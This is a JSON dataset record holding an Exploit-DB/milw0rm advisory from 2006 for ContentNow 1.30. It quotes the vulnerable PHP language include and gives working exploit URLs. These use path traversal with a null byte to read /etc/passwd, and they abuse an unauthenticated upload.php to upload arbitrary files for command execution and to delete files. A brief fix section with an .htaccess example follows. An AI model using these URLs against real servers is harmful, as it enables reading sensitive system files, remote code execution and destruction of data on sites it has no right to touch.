{
  "id": "2768",
  "title": "ContentNow 1.30 - Local File Inclusion / Arbitrary File Upload/Delete",
  "cve": null,
  "vuln_type": "path_traversal",
  "code": "#####################################################################################\r\n#                                                                                   #\r\n#                              r0ut3r Presents...                                   #\r\n#                                                                                   #\r\n#                          Another r0ut3r discovery!                                #\r\n#                                                                                   #\r\n# ContentNow 1.30 Local File Include & Arbitrary File Upload/Delete Vulnerabilities #\r\n#                                                                                   #\r\n#####################################################################################\r\n#                                                                                   #\r\n# Software: ContentNow 1.30 Vulnerabilities                                         #\r\n#                                                                                   #\r\n# Vendor: http://www.contentnow.mf4k.de/                                            #\r\n#                                                                                   #\r\n# Released: 2006/11/13                                                              #\r\n#                                                                                   #\r\n# Discovered By: r0ut3r (writ3r [at] gmail.com)                                     #\r\n#                                                                                   #\r\n# Criticality: Highly critical                                                      #\r\n#                                                                                   #\r\n#####################################################################################\r\n\r\nLocal file inclusion vulnerability\r\n------------------------------------\r\n\r\nVuln code:\r\n----------\r\n  33  // get/set language\r\n  34  $setLang= (empty ($_GET['lang'])) ? $cnCore->getBackendLanguage() : $_GET['lang'];\r\n  35  \r\n  36  // define language\r\n  37  include_once ('./language/'.$setLang.'.language.php');\r\n  38  $lang= $cnLanguageArray[$setLang];\r\n\r\nExploit:\r\n--------\r\nhttp://localhost/cn/edit.php?lang=../../../../etc/passwd%00\r\nhttp://localhost/cn/image.php?lang=../../../../etc/passwd%00\r\nhttp://localhost/cn/upload.php?lang=../../../../etc/passwd%00\r\nProbably more, never checked all files.\r\n\r\nFile Upload/Command Execution Vulnerability:\r\n---------------------------------------------\r\nNote: They tell you to set 777 permissions on install for certain folders.\r\n\r\nhttp://localhost/cn/upload.php?path=/&cid=&type=file&single=false&folder=&lang=en\r\nset path to equal dir location:\r\n/ = root path\r\n\r\nSelect file, then upload it.\r\n\r\nFile Removal Vulnerability:\r\n----------------------------\r\nTo delete files\r\nhttp://localhost/contentnow_130/cn/upload.php?path=/&cid=&type=file&folder=&lang=en&delfile=q.php&single=false\r\nset path to equal dir location:\r\n/ = root path\r\nset delfile for file you want to delete:\r\nq.php\r\n\r\nMore Information:\r\n-----------------\r\nEmail: writ3r [at] gmail.com\r\n\r\nFix:\r\n-----\r\nHow about some authentication?!\r\nOnly allow the upload of certain files types, depends what you want it to use.\r\n\r\nAs for local file includes, work out a better way to set languages, ie: make sure the language file included is required for the cms.\r\n\r\nQuick Fix:\r\n----------\r\nSetup .htaccess on cn/\r\n\r\nExample Fix:\r\n------------\r\n.htaccess:\r\nAuthName \"ContentNow Fix!\"\r\nAuthType Basic\r\nAuthUserFile /var/www/html/cn/.htpasswd\r\nRequire valid-user\r\n\r\nThis will prevent anyone from accessing this folder - this would be a solution for administrators whilst an upgrade, or patch is created.\r\nIf you do want to access this better make a .htpasswd file to. \r\n\r\n# milw0rm.com [2006-11-13]",
  "url": "https://www.exploit-db.com/exploits/2768"
}